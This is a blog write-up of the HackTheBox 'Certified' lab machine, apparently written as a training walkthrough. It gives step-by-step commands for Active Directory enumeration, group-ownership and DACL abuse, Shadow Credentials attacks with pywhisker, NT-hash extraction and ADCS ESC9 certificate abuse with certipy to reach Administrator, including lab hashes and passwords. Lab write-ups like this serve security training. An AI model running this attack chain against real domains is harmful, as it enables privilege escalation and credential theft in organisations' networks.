+++
title = "HackTheBox Certified Write-Up"
date = 2025-04-19
description = "A detailed walkthrough of the Certified machine from HackTheBox, involving Active Directory exploitation, Shadow Credentials, and ADCS abuse (ESC9)."
slug = "hackthebox-certified-write-up"
authors = ["David"]
tags = ["HackTheBox", "Active Directory", "ADCS", "Shadow Credentials", "Windows", "Certified"]
categories = ["Write-ups", "HackTheBox"]
externalLink = ""
series = []
+++

![Certified InfoCard](/images/posts/hackthebox-certified-write-up/certfied_infocard.png)

In today’s journey, we’ll be discussing about **Certified**, a machine from HackTheBox platform structured around an assumed breach scenario, where credentials for a low-privileged user are provided.

We begin by identifying that the supplied user (`judith.mader`) has the **WriteOwner** privilege over the Management group, allowing us to assume the ownership and add her to the group. This membership grants **GenericWrite** access over the `management_svc` user, which leads to a **Shadow Credentials** attack. As a result, we extract the NT hash of the `management_svc` user, that will allow us to authenticate to the target machine via WinRM.

To gain access to the `ca_operator` user, `management_svc` has the privilege **GenericAll** set over the `ca_operator` user, that will also lead to a Shadow Credentials attack. Finally, to get access to the Administrator account, we’ll be exploiting the **ADCS (Active Directory Certificate Service)**, specifically by taking advantage of the **ESC9** vulnerability.

1.  First at all, let’s make sure that we can communicate with the target machine:

    ```bash
    ping -c 2 10.10.11.41
    ```

    ![Ping](/images/posts/hackthebox-certified-write-up/one.png)

2.  Full port Nmap scan:

    ```bash
    nmap -p- --open --min-rate 3000 -n -vv -sS -Pn 10.10.11.41
    ```

    ![Nmap Scan](/images/posts/hackthebox-certified-write-up/two.png)

3.  Proceeding with deeper services and versions scan with Nmap:

    ```bash
    nmap -sC -sV -p53,88,135,139,389,445,464,593,636,3268,3269,5985,9389,49666,49669,49675,49676,49685,49718,49742,52767 -Pn 10.10.11.41 -oN services_info
    ```

    ![Service Scan](/images/posts/hackthebox-certified-write-up/two.png)

    By taking a look at the results we can see that we will be facing a Windows AD environment with its common exposed services (LDAP, SMB, WINRM, Kerberos, DNS).

4.  We’ve been provided with valid credentials, therefore, we’ll use them to get information about the target system by using netexec tool:

    ```bash
    netexec smb 10.10.11.41 -u 'judith.mader' -p 'judith09'
    ```

    ![Netexec User](/images/posts/hackthebox-certified-write-up/three.png)

    *   Domain -> certified.htb
    *   Hostname -> DC01

5.  Shares enumeration via SMB:

    ```bash
    netexec smb 10.10.11.41 -u 'judith.mader' -p 'judith09' --shares
    ```

    ![SMB Shares](/images/posts/hackthebox-certified-write-up/five.png)

    By taking a look at the content of the shares that we have access, nothing interesting was found.

6.  We don’t have anything valuable yet, which means that it’s necessary to keep enumerating. We’ll be doing it by CLI tools and also visual schemas provided by `ldapdomaindump` tool:
    *   Domain users enumeration:

    ```bash
    rpcclient -U 'judith.mader%judith09' certified.htb -c 'enumdomusers'
    ```

    ![Enum Dom Users](/images/posts/hackthebox-certified-write-up/six.png)

    *   Since we’ve found valid domain users accounts, let’s extract the usernames into a file (`users.txt`) to check if any of them is vulnerable to a AS-REP Roasting attack:

    ```bash
    GetNPUsers.py -no-pass -usersfile users.txt certified.htb/
    ```

    ![GetNPUsers](/images/posts/hackthebox-certified-write-up/seven.png)

    Since none of the users in the AD environment have the `UF_DONT_REQUIRE_PREATUH` flag set, we can’t retrieve any password hashes from users because that Kerberos pre-authentication is enforced.

7.  It’s also valid to attempt to perform an Keberoasting attack by using the valid credentials that we already have, so let’s do it:

    ```bash
    GetUserSPNs.py certified.htb/judith.mader:judith09
    ```

    ![GetUserSPNs](/images/posts/hackthebox-certified-write-up/eight.png)

    We have identified a vulnerable user account (`management_svc`), therefore we’ll proceed by requesting a TGS (Ticket Granting Service) ticket that contains a password hash.

    ```bash
    GetUserSPNs.py certified.htb/judith.mader:judith09 -request
    ```

    After obtaining the hash, we attempted to crack it, but no valid password was found.

## Enumeration continues..

*   Getting existing groups on the target system via rpcclient:
    ![RPC Groups](/images/posts/hackthebox-certified-write-up/nine.png)

*   Listing members of Admins group based on the found rid values:

    ```bash
    rpcclient -U 'judith.mader%judith09' certified.htb -c 'querygroupmem 0x200'
    ```

    The previous command will reveal an unique rid value, which probably will correspond to Administrator user.
    Anyways, we can check it by running the following command:

    ```bash
    rpcclient -U 'judith.mader%judith09' certified.htb -c 'queryuser 0x1f4'
    ```

    ![Query Admin](/images/posts/hackthebox-certified-write-up/ten.png)

*   In previous commands we’ve also seen a group called Management with `0x450` rid value, so let’s repeat the last procedure to extract information about the group and the users that are part of the group.

    ```bash
    rpcclient -U 'judith.mader%judith09' certified.htb -c 'queryuser 0x451'
    ```

    ![Query Management](/images/posts/hackthebox-certified-write-up/eleven.png)

*   In some cases, listing users profile description may reveal useful information. Let’s discover it:

    ```bash
    rpcclient -U 'judith.mader%judith09' 10.10.11.41 -c 'querydispinfo'
    ```

    ![Query Disp Info](/images/posts/hackthebox-certified-write-up/thirteen.png)

    No relevant information was exposed here.

*   Since we have valid credentials within the Active Directory environment, we can leverage `ldapdomaindump` to extract valuable domain-related data such as users, groups, computers, policies, and trusts, providing a comprehensive view of the AD infrastructure:

    ```bash
    ldapdomaindump -u 'certified.htb\judith.mader' -p judith09 -n 10.10.11.41 dc01
    ```

    ![LDAP Dump](/images/posts/hackthebox-certified-write-up/twelve.png)

    Several files have been generated, let’s review them by setting up a web server with python to serve the obtained HTML files.
    Here we can see in a visual way what we already had discover with rpcclient tool. It’s all about to try different tools to get a better understanding of the scenery we’re facing.

8.  At this stage, we don’t yet have a clear path for privilege escalation on the target system. This is where the `bloodhound-python` tool becomes crucial to visualize potential attack paths within the Active Directory environment.

    *   Collecting domain-related information based on the user credentials we already have:

    ```bash
    bloodhound-python -u judith.mader -p judith09 -ns 10.10.11.41 --zip All -d certified.htb
    ```

    ![Bloodhound Collect](/images/posts/hackthebox-certified-write-up/fourteen.png)

    In this occasion, instead of installing the bloodhound binary, we’ll be using the docker version.
    [Bloodhound – Docker](https://bloodhound.specterops.io/get-started/quickstart/community-edition-quickstart)

    *   Having upload the generated file, we can visualize the AD environment infrastructure as well as the paths to become in Domain Admins.

    ![Bloodhound Graph](/images/posts/hackthebox-certified-write-up/fifteen.png)

    The following scheme describes the attack path we should follow to escalate privileges from `judith.mader` user to `ca_operator` user:

    ![Attack Path](/images/posts/hackthebox-certified-write-up/nineteen.png)

    Let’s break it down according to BloodHound’s abuse recommendations:

    a)  Abusing the **WriteOwner** right to assign ownership of the Management group to the `judith.mader` user, and subsequently adding her as a member.
    b)  Abusing of **GenericWrite** right to pivot to the `management_svc` user by performing a shadow credentials attack.
    c)  Abusing of **GenericAll** privilege to pivot to the `ca_operator` user from `management_svc` user by performing a shadow credentials attack.

    ![GenericAll](/images/posts/hackthebox-certified-write-up/sixteen.png)

    a)  The **WriteOwner** permission allows users to change an object’s owner, in this case that object will be the **Management** group.

    *   Changing the owner of Management group:

    ```bash
    owneredit.py -action write -new-owner 'judith.mader' -target 'management' 'certified.htb'/'judith.mader':'judith09'
    ```

    ![Owner Edit](/images/posts/hackthebox-certified-write-up/twenty.png)

    *   Granting permissions to `judith.mader` to add members to the owned group:

    ```bash
    dacledit.py -action 'write' -rights 'WriteMembers' -principal 'judith.mader' -target-dn 'CN=MANAGEMENT,CN=USERS,DC=CERTIFIED,DC=HTB' 'certified.htb'/'judith.mader':'judith09'
    ```

    ![DACL Edit](/images/posts/hackthebox-certified-write-up/twenty-two.png)

    *   Adding user `judith.mader` to Management group after setting up the add members permissions:

    ```bash
    net rpc group addmem "Management" "judith.mader" -U "certified.htb/judith.mader%judith09" -S "10.10.11.41"
    ```

    *   Now, it supposes that we’re part of Management group as judith.mader user. To confirm it, we can run the following command to list the members of Management group:

    ```bash
    rpcclient -U 'judith.mader%judith09' certified.htb -c 'querygroupmem 0x450'
    ```

    ![Query Group Mem](/images/posts/hackthebox-certified-write-up/twenty-three.png)

    In the previous output, we get two rid values, corresponding to:
    *   `0x44f` -> `judith.mader`
    *   `0x451` -> `management_svc`

    There’s also another simpler way to enumerate the member of certain group via net command:

    ```bash
    net rpc group members "Management" "judith.mader" -U "certified.htb/judith.mader%judith09" -S "10.10.11.41"
    ```

    ![Net Group Members](/images/posts/hackthebox-certified-write-up/twenty-four.png)

    ![Success](/images/posts/hackthebox-certified-write-up/seventeen.png)

    ¡It worked, we are officially part of Management group!

    b)  The **GenericWrite** permission allows a user to modify all writable attributes of an object, excluding properties requiring special permissions like resetting passwords.

    *   Performing a shadow credentials attack with `pywhisker` by adding a fake certificate-based credential to the `management_svc` account using the `msDS-KeyCredentialLink` attribute:

    ```bash
    pywhisker.py -d "certified.htb" -u "judith.mader" -p "judith09" --target "management_svc" --action "add"
    ```

    ![PyWhisker Add](/images/posts/hackthebox-certified-write-up/twenty-five.png)

    *   The next step is to request a TGT using [PKINITtools](https://github.com/dirkjanm/PKINITtools). We’ll use the generated certificate and password to create a ccache file for Kerberos authentication.

    ```bash
    python3 gettgtpkinit.py -cert-pfx ../Ulb95zog.pfx -pfx-pass TIGByKbXROY40IruBATg certified.htb/management_svc management_svc.ccache
    ```

    ![GetTGT](/images/posts/hackthebox-certified-write-up/twenty-seven.png)

    ![Copy Key](/images/posts/hackthebox-certified-write-up/twenty-six.png)

    ¡Do not forget to copy the AS-REP encryption key!

    *   After having obtained the ccache (credential cache) file and the its encryption key, let’s get the NT hash of `management_svc` user:

    ```bash
    KRB5CCNAME=management_svc.ccache python3 getnthash.py -key 53624263c75ba75e0521ff0df02461af7ac22e13bbd7f783807f4a46c2b2985a -dc-ip 10.10.11.41 certified.htb/management_svc
    ```

    ![GetNTHash](/images/posts/hackthebox-certified-write-up/twenty-eight.png)

    ¡Do not forget to set the `KRB5CCNAME` environment variable with the generated ccache file!

    *   Finally, it’s time to check if the NT hash we got is valid for the `management_svc` user:

    ```bash
    netexec winrm 10.10.11.41 -u 'management_svc' -H a091c1832bcdd4677c28b5a6a1295584
    ```

    ![Check WinRM](/images/posts/hackthebox-certified-write-up/twenty-nine.png)

    ![Evil-WinRM](/images/posts/hackthebox-certified-write-up/eighteen.png)

    ¡Fantastic, we have valid credentials for `management_svc` user and as we could see, it’s also part of Remote Management Users so we can connect to the target system via evil-winrm!

    At this point, this is where we are:

    ![Progress](/images/posts/hackthebox-certified-write-up/thirty.png)

    c)  The **GenericAll** privilege grants complete control over the target object, including performing actions such as resetting passwords, adding and removing members from groups, delegating further control to other user, etc.
    The procedure is basically the same to the one performed in previous stage (b), the main difference is that for this one we don’t have the password, instead we have the NT hash.

    *   Performing a shadow credentials attack with pywhisker:

    ```bash
    pywhisker.py -d "certified.htb" -u "management_svc" -H a091c1832bcdd4677c28b5a6a1295584 --target "ca_operator" --action "add"
    ```

    The rest of the process will repeat to the previous one until we get the NT hash of `ca_operator` user.

    *   Checking if the obtained NT hash is valid for `ca_operator` user:

    ```bash
    netexec smb 10.10.11.41 -u 'ca_operator' -H b4b86f45c6018f1b664f70805f45d8f2
    ```

    ![Check CA Operator](/images/posts/hackthebox-certified-write-up/thirty-one.png)

9.  At this moment, we’ve successfully followed the attack path identified by BloodHound to escalate toward Domain Admin privileges. Since no further paths are suggested, let’s pivot and use the credentials we’ve obtained to check for vulnerable certificates using the `certipy` tool:
    *   Checking for vulnerabilities in the AD CS (Active Directory Certificate Services) infrastructure using the `management_svc` user:

    ```bash
    certipy-ad find -username management_svc -hashes :a091c1832bcdd4677c28b5a6a1295584 -dc-ip 10.10.11.41 -stdout -vulnerable
    ```

    ![Certipy Management](/images/posts/hackthebox-certified-write-up/thirty-two.png)

    None vulnerable certificate template was reported, so let’s try to do it by using the `ca_operator` user:

    ```bash
    certipy-ad find -username ca_operator -hashes :b4b86f45c6018f1b664f70805f45d8f2 -dc-ip 10.10.11.41 -stdout -vulnerable
    ```

    ![Certipy CA Operator](/images/posts/hackthebox-certified-write-up/thirty-five.png)

    ![Attention](/images/posts/hackthebox-certified-write-up/thirty-three.png)

    ¡Keep on mind the Template Name of the vulnerable certificate template, we’ll be using it later when requesting a certificate as ca_operator!

    A vulnerable certificate template was found, corresponding to **ESC9** (Exploitation Scenario 9), which involves abusing certificate templates that allow the requester to specify certain subject fields, such as the User Principal Name (UPN) or Subject Alternative Name (SAN), without proper validation.

10. In this context, the goal is to modify the `ca_operator`’s UPN to match that of the Administrator account, then request a certificate as `ca_operator`. Since the certificate will be issued for the Administrator identity, it can later be used to authenticate as the legitimate domain admin.

    *   Update the UPN (User Principal Name) of the `ca_operator` account to impersonate the Domain Administrator (Administrator) by using the valid user credentials (username + hash) of `management_svc`:

    ```bash
    certipy-ad account update -username management_svc@certified.htb -hashes :a091c1832bcdd4677c28b5a6a1295584 -user ca_operator -upn Administrator
    ```

    ![Update UPN](/images/posts/hackthebox-certified-write-up/thirty-four.png)

11. The next step is going to be requesting a certificate as `ca_operator`:

    ```bash
    certipy-ad req -username ca_operator@certified.htb -hashes :b4b86f45c6018f1b664f70805f45d8f2 -ca certified-DC01-CA -template CertifiedAuthentication -dc-ip 10.10.11.41
    ```

    ![Request Cert](/images/posts/hackthebox-certified-write-up/thirty-six.png)

12. We’ve got a valid certificate for Administrator user so, it’s recommendable to change back the UPN of `ca_operator` to be something else, like the original UPN, which is “ca_operator“:

    ```bash
    certipy-ad account update -username management_svc@certified.htb -hashes :a091c1832bcdd4677c28b5a6a1295584 -user ca_operator -upn ca_operator@certified.htb
    ```

13. Finally, authenticate with the obtained Administrator certificate to extract the NT hash.

    ```bash
    certipy-ad auth -pfx administrator.pfx -domain certified.htb
    ```

    ![Auth Cert](/images/posts/hackthebox-certified-write-up/thirty-seven.png)

    ![Pwned](/images/posts/hackthebox-certified-write-up/thirty-eight.png)

    ¡Great, now we are able to connect to the target system as Administrator user!

### Resources

*   [Certipy 4.0: ESC9 & ESC10, Authentication & Request Methods](https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7)
*   [Abusing of AD-DACL : Generic All Permissions](https://www.hackingarticles.in/abusing-ad-dacl-genericwrite/)
